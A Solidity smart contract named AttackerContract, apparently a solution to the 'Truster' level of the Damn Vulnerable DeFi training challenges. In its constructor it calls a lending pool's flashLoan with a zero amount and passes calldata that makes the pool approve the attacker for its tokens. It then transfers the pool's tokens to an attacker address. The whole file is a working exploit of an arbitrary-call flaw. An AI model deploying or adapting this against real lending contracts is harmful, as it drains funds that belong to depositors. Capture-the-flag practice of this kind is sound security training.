// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ITrustedLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface IDamnValuableToken {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external;
}

contract AttackerContract {
    constructor(
        address _token,
        address _pool,
        address _attacker,
        uint256 _amount
    ) {
        exploit(_token, _pool, _attacker, _amount);
    }

    function exploit(
        address _token,
        address _pool,
        address _attacker,
        uint256 _amount
    ) internal {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            _amount
        );
        ITrustedLenderPool(_pool).flashLoan(0, address(this), _token, data);
        IDamnValuableToken(_token).transferFrom(_pool, _attacker, _amount);
    }
}